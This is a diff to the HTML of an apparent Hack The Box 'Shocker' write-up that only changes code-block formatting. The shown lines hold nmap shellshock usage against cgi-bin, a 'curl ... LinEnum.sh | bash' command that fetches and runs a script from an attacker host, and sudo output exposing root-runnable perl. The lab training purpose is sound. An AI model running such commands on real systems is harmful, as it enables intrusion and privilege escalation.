@@ -1967,14 +1967,27 @@
 </div><ul>
 <li>Based on the name of the machine it is a shellshock machine and also because it has cgi-bin with script file</li>
 </ul>
-<pre tabindex="0"><code>locate nse | grep shellshock
-	-&gt; /usr/share/nmap/scripts/http-shellshock.nse
-
-less /usr/share/nmap/scripts/http-shellshock.nse
-	-&gt; -- @usage
-		 -- nmap -sV -p- --script http-shellshock &lt;target&gt;
-		 -- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls &lt;target&gt;
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">locate nse <span class="p">|</span> grep shellshock
+</span></span><span class="line"><span class="cl">	-&gt; /usr/share/nmap/scripts/http-shellshock.nse
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">less /usr/share/nmap/scripts/http-shellshock.nse
+</span></span><span class="line"><span class="cl">	-&gt; -- @usage
+</span></span><span class="line"><span class="cl">		 -- nmap -sV -p- --script http-shellshock &lt;target&gt;
+</span></span><span class="line"><span class="cl">		 -- nmap -sV -p- --script http-shellshock --script-args <span class="nv">uri</span><span class="o">=</span>/cgi-bin/bin,cmd<span class="o">=</span>ls &lt;target&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>Add /user.sh instead of /bin</li>
 </ul>
 <div class="highlight"><div class="chroma">
@@ -2227,24 +2240,53 @@ less /usr/share/nmap/scripts/http-shellshock.nse
 </div><ul>
 <li>In the compromised machine</li>
 </ul>
-<pre tabindex="0"><code>curl 10.10.14.35:8000/LinEnum.sh | bash
-</code></pre><pre tabindex="0"><code>[+] We can sudo without supplying a password!
-Matching Defaults entries for shelly on Shocker:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User shelly may run the following commands on Shocker:
-    (root) NOPASSWD: /usr/bin/perl
-
-
-[+] Possible sudo pwnage!
-/usr/bin/perl
-
------------------------------------------------
-# Also
-
-sudo -l
-	-&gt; (root) NOPASSWD: /usr/bin/perl
-</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl 10.10.14.35:8000/LinEnum.sh <span class="p">|</span> bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> We can sudo without supplying a password!
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> shelly on Shocker:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User shelly may run the following commands on Shocker:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Possible sudo pwnage!
+</span></span><span class="line"><span class="cl">/usr/bin/perl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------------------------------------
+</span></span><span class="line"><span class="cl"><span class="c1"># Also</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">	-&gt; <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>Source:https://gtfobins.github.io/gtfobins/perl/</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
